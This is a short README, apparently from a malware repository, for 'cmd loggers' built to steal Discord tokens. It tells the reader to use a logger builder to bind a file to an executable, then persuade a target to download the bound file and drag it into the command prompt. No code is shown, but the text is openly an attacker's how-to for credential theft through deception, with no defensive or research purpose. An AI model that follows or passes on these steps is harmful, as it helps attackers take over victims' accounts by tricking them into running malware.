# cmd loggers
pretty good, works with stubs u can use mine but it was made for discord token logging it should be in the parent directory of this file
logic works the same way for each logger, u download the logger builder and then bind the file of correct extension to the exe file

how to do it:
convince your target to download the binded file and drag and drop it into cmd prompt
